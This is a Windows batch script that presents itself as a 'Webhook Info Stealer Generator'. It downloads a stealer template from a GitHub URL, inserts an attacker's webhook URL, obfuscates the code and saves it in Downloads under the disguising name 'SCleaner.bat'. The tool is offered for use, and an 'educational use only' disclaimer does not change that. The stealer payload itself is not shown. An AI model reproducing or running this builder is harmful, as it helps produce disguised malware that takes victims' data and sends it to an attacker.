@echo off
color 0f
cd /d "%~dp0"
if not "%1"=="" set webhook=%1
for /f "tokens=4-7 delims=[.] " %%i in ('ver') do @(if "%%i"=="Version" (set windowsver=%%j) else (set windowsver=%%i))
if %WINDOWSVER% GEQ 10 (call :tc) else (call :tcoff)
call :logo
REM echo Info Stealer Generator
REM echo %GRADIENT_LINE%
echo %BRIGHT_RED%THIS TOOL IS INTENDED FOR EDUCATIONAL USE ONLY.
echo USER ASSUMES FULL LEGAL RESPONSIBILITY FOR ALL ACTIONS PERFORMED.
echo MISUSE MAY VIOLATE COMPUTER CRIME LAWS IN YOUR JURISDICTION.%RESET%
echo.
if not exist code_template.txt echo Downloading code_template.txt.. & echo. & powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://raw.githubusercontent.com/SchooiCodes/isgen/refs/heads/main/code_template.txt -OutFile code_template.txt"
if "%webhook%"=="" set /p webhook=Please enter a webhook URL: 
if exist "%TEMP%\SCleaner.bat" del "%TEMP%\SCleaner.bat"
type code_template.txt>>"%TEMP%\SCleaner.bat"
powershell -Command "(Get-Content '%TEMP%\SCleaner.bat') -replace 'your_webhook_url_here1', '%webhook%' | Set-Content '%TEMP%\SCleaner.bat'"
call obfuscator "%TEMP%\SCleaner.bat" >nul
del "%TEMP%\SCleaner.bat"
ren SCleaner___.bat SCleaner.bat >nul
move SCleaner.bat "%USERPROFILE%\Downloads\" >nul
echo.
echo %BRIGHT_GREEN2%Info Stealer generated and obfuscated%RESET% %GOLD%(%RESET%%USERPROFILE%\Downloads\SCleaner.bat%GOLD%)%RESET%
if "%1"=="" pause >nul
if "%1"=="" exit
if NOT "%1"=="" goto :EOF

:tc
set "Bright_Red=[91m"
set "Gold=[38;5;220m"
set "BRIGHT_GREEN2=[38;5;46m"
set "RESET=[97m"
set "GRADIENT_SCHOOI=[38;5;46mS[38;5;47mc[38;5;48mh[38;5;49mo[38;5;50mo[38;5;51mi%RESET%"
set "GRADIENT_GITHUB=[38;2;130;70;160mS[38;2;143;89;170mc[38;2;155;107;179mh[38;2;168;126;189mo[38;2;180;144;198mo[38;2;193;163;208mi[38;2;205;181;217mC[38;2;218;200;227mo[38;2;230;218;236md[38;2;243;237;246me[38;2;255;255;255ms%RESET%"
REM set "GRADIENT_LINE=[38;5;46m=====[38;5;82m===[38;5;118m===[38;5;154m====[38;5;190m===[38;5;226m====[0m%RESET%"
goto :EOF

:tcoff
set "GRADIENT_SCHOOI=Schooi"
set "GRADIENT_GITHUB=SchooiCodes"
REM set "GRADIENT_LINE=[38;5;46m=====[38;5;82m===[38;5;118m===[38;5;154m====[38;5;190m===[38;5;226m====[0m%RESET%"
goto :EOF

:logo
for /f "tokens=2,*delims=:" %%i in ('chcp') do set /a oldcp=%%i
chcp 65001 >nul
echo/██╗███████╗ ██████╗  Webhook Info Stealer Generator
echo/██║██╔════╝██╔════╝  Made by %GRADIENT_SCHOOI%
echo/██║███████╗██║  ███╗ https://github.com/%GRADIENT_GITHUB%/isgen
echo/██║╚════██║██║   ██║
echo/██║███████║╚██████╔╝
echo/╚═╝╚══════╝ ╚═════╝ 
chcp %oldcp% >nul
echo.
goto :EOF